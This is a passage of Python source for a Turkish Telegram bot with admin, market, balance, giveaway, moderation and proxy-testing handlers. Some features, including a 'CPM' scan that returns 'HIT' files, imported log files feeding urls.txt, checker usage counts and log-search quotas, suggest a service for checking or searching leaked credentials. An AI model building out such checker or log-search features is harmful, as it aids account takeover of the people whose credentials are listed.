    bot.send_message(message.chat.id, f"Config yazılamadı: {e}")
    return
  bot.send_message(message.chat.id, f"✅ CHAT_ID kaydedildi: `{cid}`", parse_mode="Markdown")

@bot.message_handler(commands=['removeadmin'])
def remove_admin_command(message):
  """Sadece mevcut admin: /removeadmin 123456789"""
  user_id = message.from_user.id
  if user_id not in admin_ids_set:
    bot.send_message(message.chat.id, "❌ Yetkiniz yok.")
    return
  parts = (message.text or "").split()
  if len(parts) < 2 or not parts[1].isdigit():
    bot.send_message(message.chat.id, "Kullanım: `/removeadmin TELEGRAM_ID`", parse_mode="Markdown")
    return
  target = int(parts[1])
  if target in DEFAULT_ADMINS:
    bot.send_message(message.chat.id, "❌ Varsayılan (kurucu) admin çıkarılamaz.")
    return
  if target not in admin_ids_set:
    bot.send_message(message.chat.id, "ℹ️ Bu ID zaten admin değil.")
    return
  if int(target) in LOCKED_ADMIN_IDS or int(target) in set(DEFAULT_ADMINS):
    bot.reply_to(message, "❌ Bu admin kilitli — çıkarılamaz (ana sahip).")
    return
  admin_ids_set.discard(target)
  save_data()
  log_activity("admin_remove", user_id, str(target))
  bot.send_message(message.chat.id, f"✅ `{target}` yöneticilikten çıkarıldı.", parse_mode="Markdown")
  try:
    bot.send_message(target, "⚠️ Yönetici yetkiniz kaldırıldı.")
  except Exception:
    pass

@bot.message_handler(commands=['tempmail', 'mail', 'gecicimail'])
def tempmail_command(message):
  """/tempmail — geçici mail paneli (menüden bağımsız)."""
  user_id = message.from_user.id
  chat_id = message.chat.id
  if check_spam(user_id, chat_id, message.from_user.username):
    return
  if is_user_banned(user_id):
    return
  if is_maintenance_blocking(user_id):
    bot.send_message(chat_id, get_maintenance_block_text(), parse_mode="Markdown")
    return
  if user_id not in admin_ids_set and not has_channel_access(user_id):
    send_channel_gate(chat_id, user_id)
    return
  ensure_user(user_id, username=message.from_user.username, first_name=message.from_user.first_name)
  text = tempmail_panel_text(user_id)
  markup = tempmail_panel_markup(user_id)
  bot.send_message(chat_id, text, reply_markup=markup, parse_mode="Markdown")

@bot.message_handler(commands=['durdur'])
def stop_command(message):
  chat_id = message.chat.id
  user_id = message.from_user.id
  if check_spam(user_id, chat_id, message.from_user.username): return
  if is_user_banned(user_id): return

  stopped_any = False
  if chat_id in active_auto_slots:
    active_auto_slots[chat_id] = False
    bot.send_message(chat_id, "🛑 Otomatik slot durduruldu.")
    stopped_any = True
  job = active_cpm_jobs.get(user_id)
  if job and not job.get("stop"):
    job["stop"] = True
    active_cpm_jobs[user_id] = job
    bot.send_message(
      chat_id,
      "🛑 **CPM tarama durdurma isteği alındı.**\n"
      "Mevcut hesap bitince panel güncellenir; o ana kadarki HIT'ler yine .txt gelir.",
      parse_mode="Markdown",
    )
    stopped_any = True
  if not stopped_any:
    bot.send_message(chat_id, "ℹ️ Çalışan slot veya CPM taraması yok.")

@bot.message_handler(commands=['id', 'myid'])
def show_user_id_command(message):
  user_id = message.from_user.id
  if check_spam(user_id, message.chat.id, message.from_user.username): return
  uname = f"@{message.from_user.username}" if message.from_user.username else "Yok"
  name = message.from_user.first_name or ""
  if message.from_user.last_name:
    name = f"{name} {message.from_user.last_name}".strip()
  text = (
    f"🆔 **Telegram ID Bilginiz**\n\n"
    f"👤 İsim: **{name}**\n"
    f"🔗 Kullanıcı adı: {uname}\n"
    f"🆔 ID: `{user_id}`\n\n"
    f"Bu ID'yi kopyalayıp destek / transfer işlemlerinde kullanabilirsiniz."
  )
  bot.reply_to(message, text, parse_mode="Markdown")

@bot.message_handler(commands=['bakiye'])
def check_user_balance_command(message):
  user_id = message.from_user.id
  if check_spam(user_id, message.chat.id, message.from_user.username): return
  if is_user_banned(user_id): return
  if not has_channel_access(user_id):
    send_channel_gate(message.chat.id, user_id)
    return

  norm_bal = user_balances.get(user_id, 0.0)
  ref_bal = ref_balances.get(user_id, 0.0)

  text = (
    f"💳 **Cüzdan ve Bakiye Bilginiz**\n\n"
    f"💵 Normal Bakiye: **{format_balance(user_id, norm_bal)}**\n"
    f"💰 Referans Bakiyesi: **{ref_bal:.2f} TL**\n"
    f"⭐ Level: **{user_level.get(user_id, 1)}** | XP: **{user_xp.get(user_id, 0)}**\n\n"
    f"🛒 Bakiyenizi market alışverişlerinizde ve şans oyunlarında kullanabilirsiniz."
  )
  bot.reply_to(message, text, parse_mode="Markdown")

@bot.message_handler(commands=['logimport', 'log_inbox'])
def log_import_command(message):
  """Admin: log_inbox klasöründeki büyük txt'leri urls.txt'ye aktar."""
  user_id = message.from_user.id
  chat_id = message.chat.id
  if check_spam(user_id, chat_id, message.from_user.username): return
  if user_id not in admin_ids_set:
    bot.reply_to(message, "❌ Sadece admin.")
    return
  ensure_log_inbox_dirs()
  pending = list_log_inbox_files()
  if not pending:
    bot.reply_to(
      message,
      f"📭 `{LOG_INBOX_DIR}/` boş.\n"
      f"Dosyaları şuraya koy: `{os.path.abspath(LOG_INBOX_DIR)}`\n"
      f"Sonra `/logimport` yaz.",
      parse_mode="Markdown"
    )
    return
  bot.reply_to(message, f"⏳ **{len(pending)} dosya** işleniyor...", parse_mode="Markdown")
  result = import_log_inbox(move_done=True)
  log_activity("log_inbox_import", user_id, f"cmd ok={result['files_ok']} lines={result['lines_added']}")
  text = result["message"]
  if len(text) > 4000:
    text = text[:3900] + "\n\n... (kısaltıldı)"
  bot.send_message(chat_id, text, parse_mode="Markdown")

@bot.message_handler(commands=['market', 'jackpot', 'bonus', 'level', 'quests'])
def quick_commands(message):
  user_id = message.from_user.id
  chat_id = message.chat.id
  if check_spam(user_id, chat_id, message.from_user.username): return
  if is_user_banned(user_id): return
  if is_maintenance_blocking(user_id):
    bot.send_message(chat_id, get_maintenance_block_text(), parse_mode="Markdown")
    return
  if not has_channel_access(user_id):
    send_channel_gate(chat_id, user_id)
    return
  cmd = message.text.split()[0].replace("/", "").lower()
  if cmd == "market":
    markup = types.InlineKeyboardMarkup(row_width=1)
    for key, item in market_data.items():
      stock_count = len(get_stock_list(item["stock_file"])) if "stock_file" in item else 0
      markup.add(types.InlineKeyboardButton(f"🛒 {item['name']} - {item['price']} TL (Stok: {stock_count})", callback_data=f"buy_market_{key}"))
    markup.add(types.InlineKeyboardButton(t(user_id, "btn_back_main"), callback_data="main_menu"))
    bot.send_message(chat_id, t(user_id, "market_title", bal=user_balances.get(user_id, 0.0)), reply_markup=markup, parse_mode="Markdown")
  elif cmd == "jackpot":
    bot.send_message(chat_id, f"🎰 Jackpot: **{jackpot_pool:.2f} TL**", parse_mode="Markdown")
  elif cmd == "bonus":
    ok, amount = claim_daily_bonus(user_id)
    if ok:
      add_balance_history(user_id, "daily_bonus", amount, "Komut")
      bot.send_message(chat_id, f"🎁 +{amount:.2f} TL günlük bonus!", parse_mode="Markdown")
    else:
      bot.send_message(chat_id, "❌ Bugün bonus aldınız.")
  elif cmd == "level":
    bot.send_message(chat_id, f"⭐ Level **{user_level.get(user_id,1)}** | XP **{user_xp.get(user_id,0)}**", parse_mode="Markdown")
  elif cmd == "quests":
    today = datetime.now().strftime("%Y-%m-%d")
    q = daily_quests.get(user_id, {})
    if q.get("date") != today:
      q = {"slot": 0, "ilan": 0}
    bot.send_message(chat_id, f"📋 Slot: {q.get('slot',0)}/3 | İlan: {q.get('ilan',0)}/1", parse_mode="Markdown")

@bot.inline_handler(lambda query: True)
def inline_search(query):
  try:
    q = (query.query or "").strip().lower()
    results = []
    idx = 0
    for l_id, item in listings.items():
      title = (item.get("title") or "").lower()
      if q and q not in title:
        continue
      idx += 1
      if idx > 20:
        break
      r = types.InlineQueryResultArticle(
        id=l_id,
        title=f"{item.get('title','İlan')} - {item.get('price',0)} TL",
        description=(item.get("desc") or "")[:80],
        input_message_content=types.InputTextMessageContent(
          f"📢 **{item.get('title')}**\n💵 {item.get('price')} TL\n📦 Stok: {item.get('stock',1)}\n🆔 `{l_id}`",
          parse_mode="Markdown"
        )
      )
      results.append(r)
    if not results:
      results.append(types.InlineQueryResultArticle(
        id="none",
        title="Sonuç yok",
        input_message_content=types.InputTextMessageContent("İlan bulunamadı.")
      ))
    bot.answer_inline_query(query.id, results, cache_time=10)
  except Exception as e:
    print(f"Inline error: {e}")

@bot.message_handler(commands=['build', 'versiyon', 'version'])
def cmd_build(message):
  try:
    bot.send_message(
      message.chat.id,
      f"🏷 **Bot build:** `{BOT_BUILD_TAG}`\n"
      f"✅ HESAP/MT + yıldız fiyat + SS (numara yok)",
      parse_mode="Markdown",
    )
  except Exception:
    pass

@bot.message_handler(commands=['banimiac', 'unban_me', 'chatunban'])
def cmd_banimiac(message):
  """Chat grubunda banlı kullanıcı — admin onaylı unban talebi."""
  user_id = message.from_user.id
  chat_id = message.chat.id
  username = message.from_user.username
  if check_spam(user_id, chat_id, username):
    return
  if is_user_banned(user_id):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(t(user_id, "btn_request_unban"), callback_data="request_unban"))
    bot.send_message(
      chat_id,
      "❌ Bot tarafından engellisin.\n"
      "Aşağıdaki butonla **bot banı** kaldırma talebi gönder.",
      reply_markup=markup,
      parse_mode="Markdown",
    )
    return
  chat_banned = is_chat_group_banned(user_id)
  ch_banned = is_channel_group_banned(user_id)
  if not chat_banned and not ch_banned:
    ch_ok, chat_ok = membership_status(user_id)
    if ch_ok and chat_ok:
      bot.send_message(chat_id, "✅ Zaten kanal + chat üyesisin, ban görünmüyor. Ana menü için /start")
      return
    bot.send_message(
      chat_id,
      "ℹ️ Telegram seni **kicked/banlı** olarak göstermiyor.\n"
      "Yine de gruba giremiyorsan talep gönderebilirsin.\n"
      "Admin onaylarsa unban denenecek.",
      parse_mode="Markdown",
    )
  ok, msg = send_chat_unban_request(user_id, username=username, reason="cmd_/banimiac")
  bot.send_message(chat_id, msg, parse_mode="Markdown")

@bot.message_handler(commands=['ping', 'bot'])
def ping_cmd(message):
  try:
    import os as _os
    me = None
    try:
      me = bot.get_me()
    except Exception as _e:
      me = None
    uname = ("@" + me.username) if me and getattr(me, "username", None) else "?"
    bot.reply_to(
      message,
      "Bot online\nPID: %s\nBot: %s\nSen: %s\nAdmin: %s"
      % (
        _os.getpid(),
        uname,
        message.from_user.id,
        "evet" if message.from_user.id in admin_ids_set else "hayir",
      ),
    )
    print("PING ok from", message.from_user.id, "pid", _os.getpid())
  except Exception as e:
    print("ping fail", e)
    try:
      bot.send_message(message.chat.id, "ping hata: %s" % e)
    except Exception:
      pass

@bot.message_handler(
  func=lambda m: m.chat and m.chat.type in ("group", "supergroup", "channel"),
  content_types=["text", "photo", "video", "video_note", "animation", "document", "sticker", "audio", "voice"],
)
def group_guard_messages(message):
  """Grup/kanal: CC dump, video burst, kufur."""
  try:
    chat_id = message.chat.id
    if not _guard_applies(chat_id):
      return
    user = message.from_user
    if not user:
      return
    user_id = user.id
    name = user.first_name or (user.username or str(user_id))
    try:
      chat_msg_counts[user_id] = int(chat_msg_counts.get(user_id) or 0) + 1
    except Exception:
      pass
    try:
      _guard_log_message(chat_id, user_id, message.message_id)
    except Exception:
      pass

    if user_id == GROUP_OWNER_ID:
      return

    body = (message.text or message.caption or "") or ""

    # CC dump
    if GUARD_CC_ENABLED and body and message_contains_cc(body):
      punish_cc_dump(chat_id, user_id, name, message.message_id)
      return

    # Video burst
    if GUARD_VIDEO_BURST_ENABLED and _message_is_video_like(message):
      n = _register_video_burst(chat_id, user_id)
      if n >= int(GUARD_VIDEO_BURST_LIMIT):
        try:
          bot.delete_message(chat_id, message.message_id)
        except Exception:
          pass
        punish_video_burst(chat_id, user_id, name)
        return

    # Kufur — admin muaf
    if user_id in admin_ids_set:
      return
    try:
      mem = bot.get_chat_member(chat_id, user_id)
      if mem.status in ("creator", "administrator"):
        return
    except Exception:
      pass
    text_l = (message.text or "")
    if not text_l or not _swear_pattern().search(text_l):
      return
    key = _guard_key(chat_id, user_id)
    member_warns[key] = int(member_warns.get(key) or 0) + 1
    w = member_warns[key]
    limit = int(globals().get("SWEAR_WARN_LIMIT", 10) or 10)
    mute_sec = int(globals().get("SWEAR_MUTE_SEC", 300) or 300)
    if w <= limit:
      reply = (
        f"⚠️ **Uyarı {w}/{limit}** — {name}\n"
        f"Küfür etme. **{limit}** uyarıdan sonra **{mute_sec // 60} dk** susturulursun."
      )
    else:
      group_mute_user(chat_id, user_id, mute_sec)
      member_warns[key] = 0
      reply = (
        f"🔇 **{name}** — {limit} uyarı doldu, **{mute_sec // 60} dk** susturuldu.\n"
        f"Tekrar küfür = yeniden uyarı sayacı."
      )
      try:
        _notify_owner(f"🔇 Mute chat={chat_id} user={user_id} {name}")
      except Exception:
        pass
    try:
      save_data()
    except Exception:
      pass
    try:
      bot.reply_to(message, reply, parse_mode="Markdown")
    except Exception:
      try:
        bot.send_message(chat_id, reply, parse_mode="Markdown")
      except Exception:
        pass
  except Exception as e:
    log_error("group_guard_messages", e)


@bot.message_handler(commands=["glock", "grouplock"])
def cmd_group_lock(message):
  try:
    uid = message.from_user.id
    if uid not in admin_ids_set and uid != GROUP_OWNER_ID:
      return
    if message.chat.type not in ("group", "supergroup"):
      bot.reply_to(message, "Sadece grupta.")
      return
    if group_lock_chat(message.chat.id):
      bot.reply_to(message, "🔒 Grup kilitlendi.")
    else:
      bot.reply_to(message, "❌ Kilitlenemedi (bot yetkisi lazım).")
  except Exception as e:
    log_error("cmd_group_lock", e)

@bot.message_handler(commands=["gunlock", "groupunlock"])
def cmd_group_unlock(message):
  try:
    uid = message.from_user.id
    if uid not in admin_ids_set and uid != GROUP_OWNER_ID:
      return
    if message.chat.type not in ("group", "supergroup"):
      bot.reply_to(message, "Sadece grupta.")
      return
    if group_unlock_chat(message.chat.id):
      bot.reply_to(message, "🔓 Grup kilidi açıldı.")
    else:
      bot.reply_to(message, "❌ Açılamadı.")
  except Exception as e:
    log_error("cmd_group_unlock", e)

@bot.chat_member_handler(func=lambda u: True)
def group_guard_admin_bans(update):
  """Admin birini banlayinca say; 3 uyari, 4. de yetki al + ban (admin)."""
  try:
    if not update or not getattr(update, "chat", None):
      return
    chat_id = update.chat.id
    if not _guard_applies(chat_id):
      return
    old = update.old_chat_member
    new = update.new_chat_member
    if not old or not new:
      return
    if new.status not in ("kicked", "left"):
      return
    if old.status in ("kicked", "left"):
      return
    actor = update.from_user
    if not actor:
      return
    admin_id = actor.id
    if admin_id == GROUP_OWNER_ID:
      return  # kurucu serbest
    banned_id = new.user.id if new.user else 0
    try:
      mem = bot.get_chat_member(chat_id, admin_id)
      if mem.status not in ("administrator", "creator"):
        return
      if mem.status == "creator":
        return
    except Exception:
      pass
    admin_ban_strikes[admin_id] = int(admin_ban_strikes.get(admin_id) or 0) + 1
    c = admin_ban_strikes[admin_id]
    try:
      save_data()
    except Exception:
      pass
    an = actor.first_name or str(admin_id)
    bn = (new.user.first_name if new.user else "") or str(banned_id)
    msg = (
      f"⚠️ Admin **{an}** (`{admin_id}`) ban attı → `{banned_id}` {bn}\n"
      f"Chat `{chat_id}` · Sayacı: **{c}/{ADMIN_BAN_LIMIT}**"
    )
    if c <= ADMIN_BAN_LIMIT:
      msg += "\n(Limit aşımında yetki alınır + ban)"
      _notify_owner(msg)
      try:
        bot.send_message(chat_id, f"⚠️ Admin ban kaydı: {an} ({c}/{ADMIN_BAN_LIMIT})")
      except Exception:
        pass
    if c > ADMIN_BAN_LIMIT:
      group_demote_admin(chat_id, admin_id)
      group_ban_user(chat_id, admin_id)
      admin_ban_strikes[admin_id] = 0
      _notify_owner(
        f"🚨 Admin limit aşıldı\n**{an}** (`{admin_id}`) yetkisi alındı + ban\nChat `{chat_id}`"
      )
      try:
        bot.send_message(chat_id, f"🚨 {an} — fazla ban · yetki alındı + ban.")
      except Exception:
        pass
  except Exception as e:
    log_error("group_guard_admin_bans", e)

@bot.message_handler(commands=['start'])
def send_welcome(message):
  try:
    user_id = message.from_user.id
    chat_id = message.chat.id
    print("START from", user_id, "chat", chat_id)

    if check_spam(user_id, chat_id, message.from_user.username):
      print("START blocked spam", user_id)
      return

    if is_user_banned(user_id):
      markup = types.InlineKeyboardMarkup()
      markup.add(types.InlineKeyboardButton(t(user_id, "btn_request_unban"), callback_data="request_unban"))

      ban_msg = t(user_id, "banned_msg")
      if user_id in temp_banned_users:
        kalan_saniye = int(temp_banned_users[user_id] - time.time())
        kalan_saat = kalan_saniye // 3600
        kalan_dak = (kalan_saniye % 3600) // 60
        ban_msg = t(user_id, "temp_ban_msg", hours=kalan_saat, mins=kalan_dak)

      bot.send_message(chat_id, ban_msg, reply_markup=markup, parse_mode="Markdown")
      return

    if is_maintenance_blocking(user_id):
      bot.send_message(chat_id, get_maintenance_block_text(), parse_mode="Markdown")
      return

    args = message.text.split()
    start_payload = args[1].strip() if len(args) > 1 else ""
    if start_payload.isdigit():
      admin_temp_data.setdefault(chat_id, {})['ref_id'] = int(start_payload)

    # /start cekilis — kanaldaki deep-link ile doğrudan katıl
    if start_payload.lower() in ("cekilis", "çekiliş", "cekilis", "join_cekilis"):
      try:
        ensure_user(
          user_id,
          username=message.from_user.username,
          first_name=message.from_user.first_name
        )
      except Exception:
        pass
      ok, jmsg = join_daily_cekilis(user_id)
      markup = types.InlineKeyboardMarkup()
      markup.add(types.InlineKeyboardButton("🎁 Çekiliş", callback_data="daily_cekilis_info"))
      markup.add(types.InlineKeyboardButton("🏠 Ana Menü", callback_data="main_menu"))
      try:
        bot.send_message(chat_id, jmsg, reply_markup=markup, parse_mode="Markdown")
      except Exception:
        bot.send_message(chat_id, str(jmsg).replace("**", "").replace("`", ""))
      # Dil seçilmemişse sonra da dil menüsü gelebilir; yine de katılım kaydı alındı
      if user_id not in user_languages:
        markup_l = types.InlineKeyboardMarkup(row_width=1)
        for code, name in LANGUAGES.items():
          markup_l.add(types.InlineKeyboardButton(name, callback_data=f"set_lang_{code}"))
        bot.send_message(chat_id, t(user_id, "lang_select"), reply_markup=markup_l, parse_mode="Markdown")
      else:
        try:
          if has_channel_access(user_id):
            pass
          else:
            send_channel_gate(chat_id, user_id)
        except Exception:
          pass
      return

    if user_id not in user_languages:
      markup = types.InlineKeyboardMarkup(row_width=1)
      for code, name in LANGUAGES.items():
        markup.add(types.InlineKeyboardButton(name, callback_data=f"set_lang_{code}"))
      bot.send_message(chat_id, t(user_id, "lang_select"), reply_markup=markup, parse_mode="Markdown")
      return

    ensure_user(
      user_id,
      username=message.from_user.username,
      first_name=message.from_user.first_name
    )

    if not has_channel_access(user_id):
      send_channel_gate(chat_id, user_id)
      return

    ref_id = admin_temp_data.get(chat_id, {}).get("ref_id")
    if ref_id and ref_id != user_id and user_id not in user_referrers:
      user_referrers[user_id] = ref_id
      ref_balances[ref_id] = ref_balances.get(ref_id, 0.0) + 3.0
      try:
        _ensure_activity_week()
        referral_week_stats[ref_id] = int(referral_week_stats.get(ref_id) or 0) + 1
        bump_activity(ref_id, 5)
        try:
          season_bump(ref_id, refs=1)
        except Exception:
          pass
      except Exception:
        pass
      save_data()
      try:
        bot.send_message(ref_id, "🎉 Yeni referans! **+3.0 TL** referans bakiyesi.", parse_mode="Markdown")
      except:
        pass
      check_ref_achievements(ref_id)
    streak, streak_reward = update_login_streak(user_id)
    if streak_reward > 0:
      try:
        bot.send_message(chat_id, f"🔥 **{streak} gün seri!** +{streak_reward:.0f} TL", parse_mode="Markdown")
      except:
        pass
    if user_level.get(user_id, 1) >= 5:
      grant_achievement(user_id, "level_5")
    try_claim_channel_bonus(user_id, chat_id)
    ana_menu_goster(chat_id, user_id)
  except Exception as _start_err:
    try:
      log_error("send_welcome", _start_err)
    except Exception:
      pass
    try:
      bot.send_message(message.chat.id, f"⚠️ Start hata: {_start_err}\n/ping yaz veya botu yeniden başlat.")
    except Exception:
      print("start fail", _start_err)


def get_level_shop_text(user_id):
    xp = int(user_xp.get(user_id, 0) or 0)
    lvl = int(user_level.get(user_id, 1) or 1)
    lines = [f"⭐ **Seviye Mağazası**\nXP: **{xp}** · Lv.**{lvl}**\n"]
    for kid, item in LEVEL_SHOP.items():
      lines.append(f"• {item['name']} — **{item['xp_cost']} XP**")
    lines.append("\nSatın almak için butona bas.")
    return "\n".join(lines)

def buy_level_shop_item(user_id, item_key):
    item = LEVEL_SHOP.get(item_key)
    if not item:
      return False, "Ürün yok"
    xp = int(user_xp.get(user_id, 0) or 0)
    cost = int(item["xp_cost"])
    if xp < cost:
      return False, f"Yetersiz XP (gerekli {cost}, sende {xp})"
    user_xp[user_id] = xp - cost
    typ = item["type"]
    if typ == "balance":
      user_balances[user_id] = float(user_balances.get(user_id, 0) or 0) + float(item["amount"])
      add_balance_history(user_id, "level_shop", float(item["amount"]), item["name"])
    elif typ == "log_free":
      log_search_used[user_id] = max(0, int(log_search_used.get(user_id, 0) or 0) - int(item["amount"]))
    elif typ == "discount":
      user_discounts[user_id] = {"until": time.time() + 86400, "rate": float(item["amount"])}
    save_data()
    log_activity("level_shop", user_id, item_key)
    return True, f"✅ {item['name']} alındı!"

def get_xp_leaderboard(n=10):
    items = sorted(((uid, int(user_xp.get(uid, 0) or 0)) for uid in set(list(user_xp.keys()) + list(registered_users))), key=lambda x: x[1], reverse=True)
    return items[:n]

def get_checker_leaderboard(n=10):
    items = sorted(((uid, int(checker_usage.get(uid, 0) or 0)) for uid in checker_usage.keys()), key=lambda x: x[1], reverse=True)
    return items[:n]

def test_proxy_line(proxy_url, timeout=12):
    """Tek proxy test — (ok, detail). HTTP + HTTPS dener, birden fazla endpoint."""
    p = (proxy_url or "").strip()
    if not p:
      return False, "boş"
    low = p.lower()
    if low.startswith("socks5://") or low.startswith("socks4://"):
      proxy_url_full = p
    elif "://" not in p:
      proxy_url_full = "http://" + p
    else:
      proxy_url_full = p
    proxies = {"http": proxy_url_full, "https": proxy_url_full}
    endpoints = [
      ("http", "http://httpbin.org/ip"),
      ("http", "http://api.ipify.org?format=json"),
      ("https", "https://api.ipify.org?format=json"),
      ("https", "https://httpbin.org/ip"),
    ]
    last_err = "bilinmiyor"
    for kind, url in endpoints:
      try:
        r = requests.get(
          url,
          proxies=proxies,
          timeout=timeout,
          headers={"User-Agent": "Mozilla/5.0"},
        )
        if r.status_code != 200:
          last_err = f"HTTP {r.status_code}"
          continue
        ip = "?"
        try:
          j = r.json()
          ip = j.get("ip") or j.get("origin") or "?"
        except Exception:
          ip = (r.text or "")[:40].strip() or "?"
        return True, f"OK ({kind}) ip={ip}"
      except requests.exceptions.ProxyError as e:
        last_err = "proxy reddetti / ölü"
      except requests.exceptions.ConnectTimeout:
        last_err = "bağlantı timeout"
      except requests.exceptions.ReadTimeout:
        last_err = "okuma timeout"
      except requests.exceptions.SSLError:
        last_err = "SSL hata (proxy HTTPS desteklemiyor olabilir)"
      except Exception as e:
        msg = str(e).lower()
        if "max retries" in msg:
          last_err = "ulaşılamadı (ölü/engelli)"
        elif "timed out" in msg:
          last_err = "timeout"
        else:
          last_err = str(e)[:60]
    return False, last_err

def bot_status_text():
    import time as _t
    sz = get_urls_log_size()
    count, approx = count_urls_log_lines()
    cnt_txt = f"~{count:,}" if approx else f"{count:,}"
    maint = "AÇIK" if maintenance_mode else "KAPALI"
    try:
      t0 = _t.time()
      requests.get(f"https://api.telegram.org/bot{TOKEN}/getMe", timeout=10)
      ping = f"{(_t.time()-t0)*1000:.0f} ms"
    except Exception as e:
      ping = f"HATA: {str(e)[:40]}"
    n_users = len(registered_users)
    n_chk = sum(int(v or 0) for v in checker_usage.values())
    return (
      f"🤖 **Bot Durumu**\n\n"
      f"📡 Telegram ping: **{ping}**\n"
      f"🔧 Bakım: **{maint}**\n"
      f"👥 Kullanıcı: **{n_users}**\n"
      f"🎮 Toplam checker kullanım: **{n_chk:,}**\n"
      f"📋 urls.txt: **{format_bytes(sz)}** ({cnt_txt} satır)\n"
      f"🕐 {get_current_time_str()}"
    )

def support_tickets_text(user_id):
    mine = [(tid, t) for tid, t in active_tickets.items() if int(t.get("user_id", 0) or 0) == int(user_id)]
    if not mine:
      return "🎫 Açık destek talebin yok.\nYeni: Destek menüsünden yaz."
    lines = ["🎫 **Açık taleplerin:**\n"]
    for tid, t in mine[:15]:
      lines.append(f"• `{tid}` — {(t.get('msg') or '')[:60]}")
    return "\n".join(lines)

def fetch_crypto_prices(force=False):
  """CoinGecko public API — USD * yaklasik TRY. Cache 120 sn."""
  global stock_prices, stock_last_tick
  now = time.time()
  if (not force) and stock_prices and (now - float(stock_last_tick or 0)) < 120:
    return dict(stock_prices)
  ids = ",".join(CRYPTO_COINS.values())
  try:
    r = requests.get(
      "https://api.coingecko.com/api/v3/simple/price",
      params={"ids": ids, "vs_currencies": "try,usd"},
      timeout=12,
    )
    data = r.json() if r.status_code == 200 else {}
  except Exception as e:
    log_error("fetch_crypto", e)
    data = {}
  out = {}
  fallback = {"BTC": 2800000, "ETH": 120000, "SOL": 6500, "XRP": 90, "DOGE": 8, "BNB": 25000}
  inv = {v: k for k, v in CRYPTO_COINS.items()}
  for cid, sym in inv.items():
    row = data.get(cid) or {}
    pr = row.get("try") or (row.get("usd") and float(row["usd"]) * 34.5)
    if pr:
      out[sym] = round(float(pr), 4 if float(pr) < 100 else 2)
    elif sym in stock_prices:
      out[sym] = stock_prices[sym]
    else:
      out[sym] = float(fallback.get(sym, 100))
  if out:
    stock_prices = out
    stock_last_tick = now
  return dict(stock_prices)

def crypto_portfolio_value(user_id, prices=None):
  prices = prices or fetch_crypto_prices()
  pf = stock_portfolio.get(user_id) or {}
  total = 0.0
  for sym, amt in pf.items():
    total += float(amt or 0) * float(prices.get(sym) or 0)
  return total

def _bot_tag():
  global BOT_USERNAME
  if BOT_USERNAME:
    return f"@{BOT_USERNAME.lstrip('@')}"
  try:
    me = bot.get_me()
    BOT_USERNAME = me.username or "bot"
    return f"@{BOT_USERNAME}"
  except Exception:
    return "@bot"

def _drop_target_chat():
  """50 TL drop SADECE kanala — gruba degil."""
  global CHANNEL_ID, CONFIG
  if CHANNEL_ID:
    try:
      return int(CHANNEL_ID)
    except Exception:
      pass
  uname = (CHANNEL_USERNAME or "").strip()
  if uname:
    if not uname.startswith("@"):
      uname = "@" + uname
    try:
      ch = bot.get_chat(uname)
      cid = int(ch.id)
      try:
        CHANNEL_ID = cid
        CONFIG["CHANNEL_ID"] = cid
        with open(CONFIG_FILE, "w", encoding="utf-8") as f:
          json.dump(CONFIG, f, ensure_ascii=False, indent=4)
      except Exception:
        pass
      return cid
    except Exception as e:
      try:
        log_error("drop_resolve_channel", e)
      except Exception:
        pass
  return None

def _natural_drop_text(reward):
  tag = _bot_tag()
  opts = [
    f"küçük bir hediye · ilk basan +{int(reward)}\n{tag}",
    f"şanslı buton · +{int(reward)} ilk tıklayana\n{tag}",
    f"bugünlük mini ödül · acele et\n{tag}",
    f"sessiz drop · ilk basan alır\n{tag}",
    f"+{int(reward)} · sadece bir kişi\n{tag}",
  ]
  return random.choice(opts)

def _natural_claim_text(name, reward):
  tag = _bot_tag()
  opts = [
    f"{name} kaptı · +{int(reward)}\n{tag}",
    f"bu sefer {name} · +{int(reward)}\n{tag}",
    f"+{int(reward)} gitti → {name}\n{tag}",
    f"hızlıydı {name}\n{tag}",
  ]
  return random.choice(opts)

def _natural_top_text(name, reward, nmsg):
  tag = _bot_tag()
  opts = [
    f"en aktif: {name} ({nmsg} msg) · +{int(reward)}\n{tag}",
    f"sohbet kralı {name} · +{int(reward)}\n{tag}",
    f"{name} konuşmuş · +{int(reward)}\n{tag}",
    f"mesaj ödülü → {name}\n{tag}",
  ]
  return random.choice(opts)

def post_channel_drop():
  global channel_drop_active, chat_msg_counts, channel_drop_last_msg
  chat = _drop_target_chat()
  if not chat:
    try:
      log_error("post_channel_drop", Exception("Kanal bulunamadi — CHANNEL_ID veya CHANNEL_USERNAME ayarla (gruba atilmaz)"))
    except Exception:
      pass
    return
  try:
    if CHAT_ID is not None and int(chat) == int(CHAT_ID):
      if CHANNEL_ID:
        chat = int(CHANNEL_ID)
      else:
        return
  except Exception:
    pass
  try:
    prev = channel_drop_last_msg.get(int(chat))
    if prev:
      bot.delete_message(chat, prev)
  except Exception:
    pass
  for k, v in list(channel_drop_active.items()):
    if not v.get("claimed") and v.get("msg_id") and v.get("chat_id"):
      try:
        bot.delete_message(v["chat_id"], v["msg_id"])
      except Exception:
        pass
  channel_drop_active = {k: v for k, v in channel_drop_active.items() if not v.get("claimed")}
  code = uuid.uuid4().hex[:8]
  channel_drop_active[code] = {"claimed": False, "chat_id": chat, "msg_id": None}
  markup = types.InlineKeyboardMarkup()
  markup.add(types.InlineKeyboardButton("🎁 al", callback_data=f"chdrop_{code}"))
  try:
    msg = bot.send_message(chat, _natural_drop_text(CHANNEL_DROP_REWARD), reply_markup=markup)
    if msg is None:
      raise Exception(
        "Kanala mesaj gonderilemedi (None). "
        "Botu kanala ADMIN ekle + mesaj gonder yetkisi. CHANNEL_ID kontrol et."
      )
    mid = getattr(msg, "message_id", None)
    if mid is None:
      raise Exception("send_message message_id yok")
    channel_drop_active[code]["msg_id"] = mid
    try:
      channel_drop_last_msg[int(chat)] = mid
    except Exception:
      channel_drop_last_msg[str(chat)] = mid
  except Exception as e:
    try:
      log_error("post_channel_drop", e)
    except Exception:
      print("post_channel_drop", e)
    try:
      channel_drop_active.pop(code, None)
    except Exception:
      pass

def _today_str():
  return datetime.now().strftime("%Y-%m-%d")

def award_top_chatter_daily():
  """Gun degisince onceki gunun en cok mesaj atana +100 TL."""
  global chat_msg_counts, chat_msg_day, last_top_award_day
  today = _today_str()
  if not chat_msg_day:
    chat_msg_day = today
    return
  if chat_msg_day == today:
    return  # gun bitmedi
  if last_top_award_day == chat_msg_day:
    chat_msg_counts = {}
    chat_msg_day = today
    return
  chat = _drop_target_chat()
  counts = dict(chat_msg_counts or {})
  chat_msg_counts = {}
  prev_day = chat_msg_day
